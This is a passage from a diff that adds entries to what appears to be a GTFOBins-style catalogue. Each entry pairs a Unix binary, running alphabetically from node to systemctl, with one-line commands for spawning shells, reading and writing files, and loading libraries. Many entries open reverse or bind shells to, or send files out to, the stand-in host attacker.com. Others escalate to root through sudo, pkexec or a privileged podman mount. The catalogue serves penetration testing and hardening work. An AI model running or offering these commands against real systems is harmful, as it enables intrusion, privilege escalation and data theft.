+      "code": "node -e 'sh = require(\"child_process\").spawn(\"/bin/sh\");\nrequire(\"net\").connect(12345, \"attacker.com\", function () {\n  this.pipe(sh.stdin);\n  sh.stdout.pipe(this);\n  sh.stderr.pipe(this);\n})'"
+    },
+    {
+      "binary": "node",
+      "category": "shell",
+      "code": "node -e 'require(\"child_process\").spawn(\"/bin/sh\", {stdio: [0, 1, 2]})'"
+    },
+    {
+      "binary": "node",
+      "category": "upload",
+      "code": "node -e 'require(\"fs\").createReadStream(\"/path/to/input-file\").pipe(require(\"http\").request(\"http://attacker.com/path/to/output-file\"))'"
+    },
+    {
+      "binary": "nohup",
+      "category": "command",
+      "code": "nohup /path/to/command\ncat nohup.out"
+    },
+    {
+      "binary": "nohup",
+      "category": "shell",
+      "code": "nohup /bin/sh -c '/bin/sh </dev/tty >/dev/tty 2>/dev/tty'"
+    },
+    {
+      "binary": "npm",
+      "category": "shell",
+      "code": "echo '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' >package.json\nnpm -C . i"
+    },
+    {
+      "binary": "npm",
+      "category": "shell",
+      "code": "echo '{\"scripts\": {\"xxx\": \"/bin/sh\"}}' >package.json\nnpm -C . run xxx"
+    },
+    {
+      "binary": "npm",
+      "category": "shell",
+      "code": "npm exec /bin/sh"
+    },
+    {
+      "binary": "nroff",
+      "category": "file-read",
+      "code": "nroff /path/to/input-file"
+    },
+    {
+      "binary": "nroff",
+      "category": "shell",
+      "code": "echo /bin/sh >groff\nchmod +x groff\nGROFF_BIN_PATH=. nroff"
+    },
+    {
+      "binary": "nsenter",
+      "category": "shell",
+      "code": "nsenter /bin/sh"
+    },
+    {
+      "binary": "ntpdate",
+      "category": "file-read",
+      "code": "ntpdate -a x -k /path/to/input-file -d localhost"
+    },
+    {
+      "binary": "octave",
+      "category": "file-read",
+      "code": "octave-cli --eval 'format none; fid = fopen(\"/path/to/input-file\"); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'"
+    },
+    {
+      "binary": "octave",
+      "category": "file-write",
+      "code": "octave-cli --eval 'fid = fopen(\"/path/to/output-file\", \"w\"); fputs(fid, \"DATA\"); fclose(fid);'"
+    },
+    {
+      "binary": "octave",
+      "category": "shell",
+      "code": "octave-cli --eval 'system(\"/bin/sh\")'"
+    },
+    {
+      "binary": "od",
+      "category": "file-read",
+      "code": "od -An -c -w999 /path/to/input-file"
+    },
+    {
+      "binary": "opencode",
+      "category": "command",
+      "code": "opencode\n! /path/to/command"
+    },
+    {
+      "binary": "openssl",
+      "category": "download",
+      "code": "openssl s_client -quiet -connect attacker.com:12345 >/path/to/output-file"
+    },
+    {
+      "binary": "openssl",
+      "category": "file-read",
+      "code": "openssl enc -in /path/to/input-file"
+    },
+    {
+      "binary": "openssl",
+      "category": "file-write",
+      "code": "echo DATA | openssl enc -out /path/to/output-file"
+    },
+    {
+      "binary": "openssl",
+      "category": "file-write",
+      "code": "openssl enc -in /path/to/input-file -out /path/to/output-file"
+    },
+    {
+      "binary": "openssl",
+      "category": "library-load",
+      "code": "openssl req -engine ./lib.so"
+    },
+    {
+      "binary": "openssl",
+      "category": "reverse-shell",
+      "code": "mkfifo /path/to/temp-socket\n/bin/sh -i </path/to/temp-socket 2>&1 | openssl s_client -quiet -connect attacker.com:12345 >/path/to/temp-socket"
+    },
+    {
+      "binary": "openssl",
+      "category": "upload",
+      "code": "openssl s_client -quiet -connect attacker.com:12345 </path/to/input-file"
+    },
+    {
+      "binary": "openvpn",
+      "category": "file-read",
+      "code": "openvpn --config /path/to/input-file"
+    },
+    {
+      "binary": "openvpn",
+      "category": "shell",
+      "code": "openvpn --dev null --script-security 2 --up '/bin/sh -s'"
+    },
+    {
+      "binary": "openvt",
+      "category": "command",
+      "code": "openvt -- /path/to/command"
+    },
+    {
+      "binary": "opkg",
+      "category": "shell",
+      "code": "rpm opkg install x_1.0_all.deb"
+    },
+    {
+      "binary": "pandoc",
+      "category": "file-read",
+      "code": "pandoc -t plain /path/to/input-file"
+    },
+    {
+      "binary": "pandoc",
+      "category": "file-write",
+      "code": "echo DATA | pandoc -t plain -o /path/to/output-file"
+    },
+    {
+      "binary": "paste",
+      "category": "file-read",
+      "code": "paste /path/to/input-file"
+    },
+    {
+      "binary": "pax",
+      "category": "file-read",
+      "code": "pax -w /path/to/input-file | tar -xO"
+    },
+    {
+      "binary": "pdflatex",
+      "category": "file-read",
+      "code": "pdflatex '\\documentclass{article}\\usepackage{verbatim}\\begin{document}\\verbatiminput{/path/to/input-file}\\end{document}'\npdftotext texput.pdf -"
+    },
+    {
+      "binary": "pdflatex",
+      "category": "file-write",
+      "code": "pdflatex '\\documentclass{article}\\newwrite\\tempfile\\begin{document}\\immediate\\openout\\tempfile=output-file.tex\\immediate\\write\\tempfile{DATA}\\immediate\\closeout\\tempfile\\end{document}'"
+    },
+    {
+      "binary": "pdflatex",
+      "category": "shell",
+      "code": "pdflatex --shell-escape '\\documentclass{article}\\begin{document}\\immediate\\write18{/bin/sh}\\end{document}'"
+    },
+    {
+      "binary": "pdftex",
+      "category": "shell",
+      "code": "pdftex --shell-escape '\\write18{/bin/sh}\\end'"
+    },
+    {
+      "binary": "perf",
+      "category": "shell",
+      "code": "perf stat /bin/sh"
+    },
+    {
+      "binary": "perl",
+      "category": "download",
+      "code": "perl -MIO::Socket::INET -e '$s=new IO::Socket::INET(PeerAddr=>\"attacker.com\",PeerPort=>80,Proto=>\"tcp\") or die; print $s \"GET /path/to/input-file HTTP/1.1\\r\\nHost: attacker.com\\r\\nMetadata: true\\r\\nConnection: close\\r\\n\\r\\n\"; open(my $fh, \">\", \"/path/to/output-file\") or die; $in_content = 0; while (<$s>) { if ($in_content) { print $fh $_; } elsif ($_ eq \"\\r\\n\") { $in_content = 1; } } close($s); close($fh);'"
+    },
+    {
+      "binary": "perl",
+      "category": "file-read",
+      "code": "perl -ne print /path/to/input-file"
+    },
+    {
+      "binary": "perl",
+      "category": "reverse-shell",
+      "code": "perl -e 'use Socket;$i=\"attacker.com\";$p=12345;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+    },
+    {
+      "binary": "perl",
+      "category": "shell",
+      "code": "PERL5OPT=-d PERL5DB='exec \"/bin/sh\"' perl /dev/null"
+    },
+    {
+      "binary": "perl",
+      "category": "shell",
+      "code": "perl -e 'exec \"/bin/sh\"'"
+    },
+    {
+      "binary": "perl",
+      "category": "upload",
+      "code": "perl -MIO::Socket::INET -e '$s = new IO::Socket::INET(PeerAddr=>\"attacker.com\", PeerPort=>80, Proto=>\"tcp\") or die;open(my $file, \"<\", \"/path/to/input-file\") or die;$content = join(\"\", <$file>);close($file);$headers = \"POST / HTTP/1.1\\r\\nHost: attacker.com\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: \" . length($content) . \"\\r\\nConnection: close\\r\\n\\r\\n\";print $s $headers . $content;while (<$s>) { }close($s);'"
+    },
+    {
+      "binary": "perlbug",
+      "category": "shell",
+      "code": "perlbug -s 'x x x' -r x -c x -e 'exec /bin/sh #'"
+    },
+    {
+      "binary": "pexec",
+      "category": "shell",
+      "code": "pexec /bin/sh"
+    },
+    {
+      "binary": "pg",
+      "category": "file-read",
+      "code": "pg /path/to/input-file"
+    },
+    {
+      "binary": "pg",
+      "category": "shell",
+      "code": "pg /etc/hosts\n!/bin/sh"
+    },
+    {
+      "binary": "php",
+      "category": "command",
+      "code": "php -r '$p = array(array(\"pipe\",\"r\"),array(\"pipe\",\"w\"),array(\"pipe\", \"w\"));$h = @proc_open(\"/path/to/command\", $p, $pipes);if($h&&$pipes){while(!feof($pipes[1])) echo(fread($pipes[1],4096));while(!feof($pipes[2])) echo(fread($pipes[2],4096));fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($h);}'"
+    },
+    {
+      "binary": "php",
+      "category": "command",
+      "code": "php -r '$r=array(); exec(\"/path/to/command\", $r); print(join(\"\\n\",$r));'"
+    },
+    {
+      "binary": "php",
+      "category": "command",
+      "code": "php -r 'echo shell_exec(\"/path/to/command\");'"
+    },
+    {
+      "binary": "php",
+      "category": "download",
+      "code": "php -r '$c=file_get_contents(\"http://attacker.com/path/to/input-file\"); file_put_contents(\"/path/to/output-file\", $c);'"
+    },
+    {
+      "binary": "php",
+      "category": "file-read",
+      "code": "php -r 'readfile(\"/path/to/input-file\");'"
+    },
+    {
+      "binary": "php",
+      "category": "file-write",
+      "code": "php -r 'file_put_contents(\"/path/to/output-file\", \"DATA\");'"
+    },
+    {
+      "binary": "php",
+      "category": "reverse-shell",
+      "code": "php -r '$sock=fsockopen(\"attacker.com\",12345);exec(\"/bin/sh -i 0<&3 1>&3 2>&3\");'"
+    },
+    {
+      "binary": "php",
+      "category": "shell",
+      "code": "php -r '$h=@popen(\"/bin/sh -i\",\"r\"); if($h){ while(!feof($h)) echo(fread($h,4096)); pclose($h); }'"
+    },
+    {
+      "binary": "php",
+      "category": "shell",
+      "code": "php -r 'passthru(\"/bin/sh -i\");'"
+    },
+    {
+      "binary": "php",
+      "category": "shell",
+      "code": "php -r 'pcntl_exec(\"/bin/sh\");'"
+    },
+    {
+      "binary": "php",
+      "category": "shell",
+      "code": "php -r 'system(\"/bin/sh -i\");'"
+    },
+    {
+      "binary": "php",
+      "category": "upload",
+      "code": "php -S 0.0.0.0:80"
+    },
+    {
+      "binary": "pic",
+      "category": "file-read",
+      "code": "pic /path/to/input-file"
+    },
+    {
+      "binary": "pic",
+      "category": "shell",
+      "code": "pic -U\n.PS\nsh X sh X"
+    },
+    {
+      "binary": "pidstat",
+      "category": "shell",
+      "code": "pidstat -e /bin/sh"
+    },
+    {
+      "binary": "pip",
+      "category": "shell",
+      "code": "pip config --editor '/bin/sh -s' edit"
+    },
+    {
+      "binary": "pkexec",
+      "category": "shell",
+      "code": "pkexec /bin/sh"
+    },
+    {
+      "binary": "pkg",
+      "category": "command",
+      "code": "pkg install -y --no-repo-update ./x-1.0.txz"
+    },
+    {
+      "binary": "plymouth",
+      "category": "shell",
+      "code": "plymouth ask-for-password --prompt=x --command=/bin/sh"
+    },
+    {
+      "binary": "podman",
+      "category": "shell",
+      "code": "podman run --rm -it --privileged --volume /:/mnt alpine chroot /mnt /bin/sh"
+    },
+    {
+      "binary": "posh",
+      "category": "shell",
+      "code": "posh"
+    },
+    {
+      "binary": "pr",
+      "category": "file-read",
+      "code": "pr -T /path/to/input-file"
+    },
+    {
+      "binary": "procmail",
+      "category": "command",
+      "code": "echo -e ':0\\n| /path/to/command >/path/to/temp-file\nprocmail -m /path/to/temp-file"
+    },
+    {
+      "binary": "psftp",
+      "category": "shell",
+      "code": "psftp\n!/bin/sh"
+    },
+    {
+      "binary": "psql",
+      "category": "shell",
+      "code": "psql\n\\! /bin/sh"
+    },
+    {
+      "binary": "ptx",
+      "category": "file-read",
+      "code": "ptx -w 999 /path/to/input-file"
+    },
+    {
+      "binary": "puppet",
+      "category": "file-read",
+      "code": "puppet filebucket -l diff /dev/null /path/to/input-file"
+    },
+    {
+      "binary": "puppet",
+      "category": "file-write",
+      "code": "puppet apply -e 'file { \"/path/to/output-file\": content => \"DATA\" }'"
+    },
+    {
+      "binary": "puppet",
+      "category": "shell",
+      "code": "puppet apply -e \"exec { '/bin/sh <$(tty) >$(tty) 2>$(tty)': }\""
+    },
+    {
+      "binary": "pwsh",
+      "category": "file-write",
+      "code": "pwsh -c '\"DATA\" | Out-File /path/to/output-file'"
+    },
+    {
+      "binary": "pwsh",
+      "category": "shell",
+      "code": "pwsh"
+    },
+    {
+      "binary": "pygmentize",
+      "category": "file-read",
+      "code": "pygmentize -l text /path/to/input-file"
+    },
+    {
+      "binary": "pyright",
+      "category": "file-read",
+      "code": "pyright --outputjson /path/to/input-file"
+    },
+    {
+      "binary": "pyright",
+      "category": "file-read",
+      "code": "pyright -w /path/to/input-dir/"
+    },
+    {
+      "binary": "pyright",
+      "category": "file-read",
+      "code": "pyright /path/to/input-file"
+    },
+    {
+      "binary": "python",
+      "category": "download",
+      "code": "python -c 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(\"http://attacker.com/path/to/input-file\", \"/path/to/output-file\")'"
+    },
+    {
+      "binary": "python",
+      "category": "file-read",
+      "code": "python -c 'print(open(\"/path/to/input-file\").read())'"
+    },
+    {
+      "binary": "python",
+      "category": "file-write",
+      "code": "python -c 'open(\"/path/to/output-file\",\"w+\").write(\"DATA\")'"
+    },
+    {
+      "binary": "python",
+      "category": "library-load",
+      "code": "python -c 'from ctypes import cdll; cdll.LoadLibrary(\"/path/to/lib.so\")'"
+    },
+    {
+      "binary": "python",
+      "category": "reverse-shell",
+      "code": "python -c 'import sys,socket,os,pty;s=socket.socket()\ns.connect((\"attacker.com\",12345))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")'"
+    },
+    {
+      "binary": "python",
+      "category": "shell",
+      "code": "python -c 'import os; os.execl(\"/bin/sh\", \"sh\")'"
+    },
+    {
+      "binary": "python",
+      "category": "upload",
+      "code": "python -c 'import sys\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", 12345), s.SimpleHTTPRequestHandler).serve_forever()'"
+    },
+    {
+      "binary": "python",
+      "category": "upload",
+      "code": "python -c 'import sys\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(\"http://attacker.com\", open(\"/path/to/input-file\", \"rb\").read())'"
+    },
+    {
+      "binary": "qpdf",
+      "category": "file-read",
+      "code": "qpdf --empty --add-attachment /path/to/input-file --key=x -- /path/to/output-file\nqpdf --show-attachment=x /path/to/output-file"
+    },
+    {
+      "binary": "rake",
+      "category": "file-read",
+      "code": "rake -f /path/to/input-file"
+    },
+    {
+      "binary": "ranger",
+      "category": "shell",
+      "code": "ranger\nS"
+    },
+    {
+      "binary": "rc",
+      "category": "shell",
+      "code": "rc"
+    },
+    {
+      "binary": "readelf",
+      "category": "file-read",
+      "code": "readelf -a @/path/to/input-file"
+    },
+    {
+      "binary": "redcarpet",
+      "category": "file-read",
+      "code": "redcarpet /path/to/input-file"
+    },
+    {
+      "binary": "redis",
+      "category": "file-write",
+      "code": "redis-cli -h 127.0.0.1\nconfig set dir /path/to/output-dir/\nconfig set dbfilename output-file\nset x \"DATA\"\nsave"
+    },
+    {
+      "binary": "restic",
+      "category": "command",
+      "code": "RESTIC_PASSWORD_COMMAND='/path/to/command' restic backup"
+    },
+    {
+      "binary": "restic",
+      "category": "command",
+      "code": "restic --password-command='/path/to/command' backup"
+    },
+    {
+      "binary": "restic",
+      "category": "shell",
+      "code": "RESTIC_PASSWORD_COMMAND='/bin/sh -c \"/bin/sh 0<&2 1<&2\"' restic backup"
+    },
+    {
+      "binary": "restic",
+      "category": "shell",
+      "code": "restic --password-command='/bin/sh -c \"/bin/sh 0<&2 1<&2\"' backup"
+    },
+    {
+      "binary": "restic",
+      "category": "upload",
+      "code": "restic backup -r rest:http://attacker.com:12345/x /path/to/input-file"
+    },
+    {
+      "binary": "rev",
+      "category": "file-read",
+      "code": "rev /path/to/input-file | rev"
+    },
+    {
+      "binary": "rlogin",
+      "category": "upload",
+      "code": "rlogin -l DATA -p 12345 attacker.com"
+    },
+    {
+      "binary": "rlwrap",
+      "category": "file-write",
+      "code": "rlwrap -l /path/to/output-file echo DATA"
+    },
+    {
+      "binary": "rlwrap",
+      "category": "shell",
+      "code": "rlwrap /bin/sh"
+    },
+    {
+      "binary": "rpm",
+      "category": "command",
+      "code": "rpm -ivh x-1.0-1.noarch.rpm"
+    },
+    {
+      "binary": "rpm",
+      "category": "shell",
+      "code": "rpm --eval '%(/bin/sh 1>&2)'"
+    },
+    {
+      "binary": "rpm",
+      "category": "shell",
+      "code": "rpm --pipe '/bin/sh 0<&1'"
+    },
+    {
+      "binary": "rpmdb",
+      "category": "shell",
+      "code": "rpmdb --eval '%(/bin/sh 1>&2)'"
+    },
+    {
+      "binary": "rpmquery",
+      "category": "shell",
+      "code": "rpmquery --eval '%(/bin/sh 1>&2)'"
+    },
+    {
+      "binary": "rpmverify",
+      "category": "shell",
+      "code": "rpmverify --eval '%(/bin/sh 1>&2)'"
+    },
+    {
+      "binary": "rsync",
+      "category": "shell",
+      "code": "rsync -e '/bin/sh -c \"/bin/sh 0<&2 1>&2\"' x:x"
+    },
+    {
+      "binary": "rsyslogd",
+      "category": "command",
+      "code": "cat >/path/to/temp-file <<EOF\nmodule(load=\"imuxsock\")\n:msg, contains, \"somerandomstring\" ^/path/to/command\nEOF\n\nrsyslogd -f /path/to/temp-file"
+    },
+    {
+      "binary": "rtorrent",
+      "category": "shell",
+      "code": "echo 'execute = /bin/sh,-c,\"/bin/sh </dev/tty >/dev/tty 2>/dev/tty\"' >~/.rtorrent.rc\nrtorrent"
+    },
+    {
+      "binary": "ruby",
+      "category": "download",
+      "code": "ruby -e 'require \"open-uri\"; download = URI.open(\"http://attacker.com/path/to/input-file\"); IO.copy_stream(download, \"/path/to/output-file\")'"
+    },
+    {
+      "binary": "ruby",
+      "category": "file-read",
+      "code": "ruby -e 'puts File.read(\"/path/to/input-file\")'"
+    },
+    {
+      "binary": "ruby",
+      "category": "file-write",
+      "code": "ruby -e 'File.open(\"/path/to/output-file\", \"w+\") { |f| f.write(\"DATA\") }'"
+    },
+    {
+      "binary": "ruby",
+      "category": "library-load",
+      "code": "ruby -e 'require \"fiddle\"; Fiddle.dlopen(\"/path/to/lib.so\")'"
+    },
+    {
+      "binary": "ruby",
+      "category": "reverse-shell",
+      "code": "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"attacker.com\",12345);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
+    },
+    {
+      "binary": "ruby",
+      "category": "shell",
+      "code": "ruby -e 'exec \"/bin/sh\"'"
+    },
+    {
+      "binary": "ruby",
+      "category": "upload",
+      "code": "ruby -run -e httpd . -p 80"
+    },
+    {
+      "binary": "run-parts",
+      "category": "shell",
+      "code": "cp /bin/sh /path/to/temp-dir/\nrun-parts /path/to/temp-dir/"
+    },
+    {
+      "binary": "run-parts",
+      "category": "shell",
+      "code": "run-parts --new-session --regex '^sh$' /bin"
+    },
+    {
+      "binary": "runscript",
+      "category": "shell",
+      "code": "echo '! exec /bin/sh' >/path/to/temp-file\nrunscript /path/to/temp-file"
+    },
+    {
+      "binary": "rustc",
+      "category": "file-read",
+      "code": "rustc /path/to/input-file"
+    },
+    {
+      "binary": "rustc",
+      "category": "file-write",
+      "code": "echo 'fn main() { println!(\"DATA\"); }' >/path/to/temp-file\nrustc /path/to/temp-file -o /path/to/output-file"
+    },
+    {
+      "binary": "rustdoc",
+      "category": "file-read",
+      "code": "rustdoc /path/to/input-file"
+    },
+    {
+      "binary": "rustdoc",
+      "category": "file-write",
+      "code": "echo '//! DATA' >/path/to/temp-file\nrustdoc /path/to/temp-file -o /path/to/output-dir/"
+    },
+    {
+      "binary": "rustfmt",
+      "category": "file-read",
+      "code": "rustfmt /path/to/input-file"
+    },
+    {
+      "binary": "rustup",
+      "category": "command",
+      "code": "mkdir /path/to/temp-dir/bin/\nmkdir /path/to/temp-dir/lib/\necho '/path/to/command' >/path/to/temp-dir/bin/rustc\nchmod +x /path/to/temp-dir/bin/rustc\nrustup toolchain link x /path/to/temp-dir/\nrustup run x rustc"
+    },
+    {
+      "binary": "rustup",
+      "category": "shell",
+      "code": "mkdir /path/to/temp-dir/bin/\nmkdir /path/to/temp-dir/lib/\ncp /bin/sh /path/to/temp-dir/bin/rustc\nrustup toolchain link x /path/to/temp-dir/\nrustup run x rustc"
+    },
+    {
+      "binary": "sash",
+      "category": "shell",
+      "code": "sash"
+    },
+    {
+      "binary": "scanmem",
+      "category": "shell",
+      "code": "scanmem\nshell /bin/sh"
+    },
+    {
+      "binary": "scp",
+      "category": "download",
+      "code": "scp user@attacker.com:/path/to/input-file /path/to/output-file"
+    },
+    {
+      "binary": "scp",
+      "category": "shell",
+      "code": "echo 'exec /bin/sh 0<&2 1>&2' >/path/to/temp-file\nchmod +x /path/to/temp-file\nscp -S /path/to/temp-file x x:"
+    },
+    {
+      "binary": "scp",
+      "category": "shell",
+      "code": "scp -o 'ProxyCommand=;/bin/sh 0<&2 1>&2' x x:"
+    },
+    {
+      "binary": "scp",
+      "category": "upload",
+      "code": "scp /path/to/input-file user@attacker.com:/path/to/output-file"
+    },
+    {
+      "binary": "screen",
+      "category": "file-write",
+      "code": "screen -L -Logfile /path/to/output-file echo DATA"
+    },
+    {
+      "binary": "screen",
+      "category": "file-write",
+      "code": "screen -L /path/to/output-file echo DATA"
+    },
+    {
+      "binary": "screen",
+      "category": "shell",
+      "code": "screen"
+    },
+    {
+      "binary": "script",
+      "category": "file-write",
+      "code": "script -q -c '# DATA' /path/to/output-file"
+    },
+    {
+      "binary": "script",
+      "category": "shell",
+      "code": "script -q /dev/null"
+    },
+    {
+      "binary": "scrot",
+      "category": "shell",
+      "code": "scrot -e /bin/sh"
+    },
+    {
+      "binary": "sed",
+      "category": "file-read",
+      "code": "sed '' /path/to/input-file"
+    },
+    {
+      "binary": "sed",
+      "category": "file-write",
+      "code": "sed -n '1s/.*/DATA/w /path/to/output-file' /etc/hosts"
+    },
+    {
+      "binary": "sed",
+      "category": "shell",
+      "code": "sed -n '1e exec /bin/sh 1>&0' /etc/hosts"
+    },
+    {
+      "binary": "sed",
+      "category": "shell",
+      "code": "sed e"
+    },
+    {
+      "binary": "service",
+      "category": "shell",
+      "code": "service ../../bin/sh"
+    },
+    {
+      "binary": "setarch",
+      "category": "shell",
+      "code": "setarch -3 /bin/sh"
+    },
+    {
+      "binary": "setlock",
+      "category": "shell",
+      "code": "setlock - /bin/sh"
+    },
+    {
+      "binary": "sftp",
+      "category": "download",
+      "code": "sftp user@attacker.com\nget /path/to/input-file /path/to/output-file"
+    },
+    {
+      "binary": "sftp",
+      "category": "shell",
+      "code": "sftp user@attacker.com\n!/bin/sh"
+    },
+    {
+      "binary": "sftp",
+      "category": "upload",
+      "code": "sftp user@attacker.com\nput /path/to/input-file /path/to/output-file"
+    },
+    {
+      "binary": "sg",
+      "category": "shell",
+      "code": "sg $(id -ng)"
+    },
+    {
+      "binary": "shred",
+      "category": "file-write",
+      "code": "shred -u /path/to/output-file"
+    },
+    {
+      "binary": "shuf",
+      "category": "file-read",
+      "code": "shuf -z /path/to/input-file"
+    },
+    {
+      "binary": "shuf",
+      "category": "file-write",
+      "code": "shuf -e DATA -o /path/to/output-file"
+    },
+    {
+      "binary": "slsh",
+      "category": "shell",
+      "code": "slsh -e 'system(\"/bin/sh\")'"
+    },
+    {
+      "binary": "smbclient",
+      "category": "download",
+      "code": "smbclient '\\\\attacker.com\\share' -c 'get /path/to/input-file /path/to/output-file'"
+    },
+    {
+      "binary": "smbclient",
+      "category": "shell",
+      "code": "smbclient '\\\\host\\share'\n!/bin/sh"
+    },
+    {
+      "binary": "smbclient",
+      "category": "upload",
+      "code": "smbclient '\\\\attacker.com\\share' -c 'put /path/to/input-file /path/to/output-file'"
+    },
+    {
+      "binary": "snap",
+      "category": "command",
+      "code": "snap install xxxx_1.0_all.snap --dangerous --devmode"
+    },
+    {
+      "binary": "socat",
+      "category": "bind-shell",
+      "code": "socat tcp-listen:12345,reuseaddr,fork exec:/bin/sh,pty,stderr,setsid,sigint,sane"
+    },
+    {
+      "binary": "socat",
+      "category": "download",
+      "code": "socat -u tcp-connect:attacker.com:12345 open:/path/to/output-file,creat"
+    },
+    {
+      "binary": "socat",
+      "category": "file-read",
+      "code": "socat -u file:/path/to/input-file -"
+    },
+    {
+      "binary": "socat",
+      "category": "file-write",
+      "code": "socat -u 'exec:echo DATA' open:/path/to/output-file,creat"
+    },
+    {
+      "binary": "socat",
+      "category": "reverse-shell",
+      "code": "socat tcp-connect:attacker.com:12345 exec:/bin/sh,pty,stderr,setsid,sigint,sane"
+    },
+    {
+      "binary": "socat",
+      "category": "shell",
+      "code": "socat - exec:/bin/sh,pty,ctty,raw,echo=0"
+    },
+    {
+      "binary": "socat",
+      "category": "upload",
+      "code": "socat -u file:/path/to/input-file tcp-connect:attacker.com:12345"
+    },
+    {
+      "binary": "socket",
+      "category": "bind-shell",
+      "code": "socket -svp '/bin/sh -i' 12345"
+    },
+    {
+      "binary": "socket",
+      "category": "reverse-shell",
+      "code": "socket -qvp '/bin/sh -i' attacker.com 12345"
+    },
+    {
+      "binary": "soelim",
+      "category": "file-read",
+      "code": "soelim /path/to/input-file"
+    },
+    {
+      "binary": "softlimit",
+      "category": "shell",
+      "code": "softlimit /bin/sh"
+    },
+    {
+      "binary": "sort",
+      "category": "file-read",
+      "code": "sort -m /path/to/input-file"
+    },
+    {
+      "binary": "sort",
+      "category": "file-write",
+      "code": "echo DATA | sort -m -o /path/to/output-file"
+    },
+    {
+      "binary": "split",
+      "category": "file-read",
+      "code": "split -b 999 --additional-suffix suffix /path/to/input-file prefix\ncat prefixaasuffix"
+    },
+    {
+      "binary": "split",
+      "category": "file-write",
+      "code": "split -b 999 --additional-suffix suffix /path/to/input-file prefix"
+    },
+    {
+      "binary": "split",
+      "category": "shell",
+      "code": "split --filter='/bin/sh -i 0<&2 1>&2' /etc/hosts"
+    },
+    {
+      "binary": "sqlite3",
+      "category": "file-read",
+      "code": "sqlite3 <<EOF\nCREATE TABLE x(x TEXT);\n.import /path/to/input-file x\nSELECT * FROM x;\nEOF"
+    },
+    {
+      "binary": "sqlite3",
+      "category": "file-write",
+      "code": "sqlite3 /dev/null -cmd '.output /path/to/output-file' 'select \"DATA\";'"
+    },
+    {
+      "binary": "sqlite3",
+      "category": "shell",
+      "code": "sqlite3 /dev/null '.shell /bin/sh'"
+    },
+    {
+      "binary": "ss",
+      "category": "file-read",
+      "code": "ss -a -F /path/to/input-file"
+    },
+    {
+      "binary": "ssh",
+      "category": "download",
+      "code": "ssh user@attacker.com 'cat /path/to/input-file\""
+    },
+    {
+      "binary": "ssh",
+      "category": "file-read",
+      "code": "ssh -F /path/to/input-file x"
+    },
+    {
+      "binary": "ssh",
+      "category": "shell",
+      "code": "ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost"
+    },
+    {
+      "binary": "ssh",
+      "category": "shell",
+      "code": "ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x"
+    },
+    {
+      "binary": "ssh",
+      "category": "shell",
+      "code": "ssh localhost /bin/sh"
+    },
+    {
+      "binary": "ssh",
+      "category": "upload",
+      "code": "echo DATA | ssh user@attacker.com 'cat >/path/to/output-file\""
+    },
+    {
+      "binary": "ssh-agent",
+      "category": "shell",
+      "code": "ssh-agent /bin/sh"
+    },
+    {
+      "binary": "ssh-copy-id",
+      "category": "file-read",
+      "code": "ssh-copy-id -f -i /path/to/input-file.pub user@attacker.com"
+    },
+    {
+      "binary": "ssh-copy-id",
+      "category": "file-write",
+      "code": "ssh-copy-id -f -i /path/to/input-file.pub -t /path/to/output-file user@host"
+    },
+    {
+      "binary": "ssh-keygen",
+      "category": "library-load",
+      "code": "ssh-keygen -D /path/to/lib.so"
+    },
+    {
+      "binary": "ssh-keyscan",
+      "category": "file-read",
+      "code": "ssh-keyscan -f /path/to/input-file"
+    },
+    {
+      "binary": "sshfs",
+      "category": "command",
+      "code": "sshfs -o ssh_command=/path/to/command x: /path/to/dir/"
+    },
+    {
+      "binary": "sshfs",
+      "category": "download",
+      "code": "sshfs user@attacker.com:/ /path/to/dir/\ncp /path/to/dir/path/to/input-file /path/to/output-file"
+    },
+    {
+      "binary": "sshfs",
+      "category": "shell",
+      "code": "echo -e '/bin/sh </dev/tty >/dev/tty 2>/dev/tty' >/path/to/temp-file\nchmod +x /path/to/temp-file\nsshfs -o ssh_command=/path/to/temp-file x: /path/to/dir/"
+    },
+    {
+      "binary": "sshfs",
+      "category": "upload",
+      "code": "sshfs user@attacker.com:/ /path/to/dir/\ncp /path/to/input-file /path/to/dir/"
+    },
+    {
+      "binary": "sshpass",
+      "category": "shell",
+      "code": "sshpass /bin/sh"
+    },
+    {
+      "binary": "sshuttle",
+      "category": "shell",
+      "code": "sudo sshuttle -r x --ssh-cmd '/bin/sh -c \"/bin/sh 0<&2 1>&2\"' localhost"
+    },
+    {
+      "binary": "start-stop-daemon",
+      "category": "shell",
+      "code": "start-stop-daemon -S -x /bin/sh"
+    },
+    {
+      "binary": "stdbuf",
+      "category": "shell",
+      "code": "stdbuf -i0 /bin/sh"
+    },
+    {
+      "binary": "strace",
+      "category": "file-write",
+      "code": "strace -s 999 -o /path/to/output-file strace - DATA"
+    },
+    {
+      "binary": "strace",
+      "category": "shell",
+      "code": "strace -o /dev/null /bin/sh"
+    },
+    {
+      "binary": "strings",
+      "category": "file-read",
+      "code": "strings /path/to/input-file"
+    },
+    {
+      "binary": "su",
+      "category": "shell",
+      "code": "su -c /bin/sh"
+    },
+    {
+      "binary": "sudo",
+      "category": "shell",
+      "code": "sudo /bin/sh"
+    },
+    {
+      "binary": "sysctl",
+      "category": "command",
+      "code": "sysctl 'kernel.core_pattern=|/path/to/command'"
+    },
+    {
+      "binary": "sysctl",
+      "category": "file-read",
+      "code": "sysctl -n \"/../../path/to/input-file\""
+    },
+    {
+      "binary": "systemctl",
+      "category": "shell",
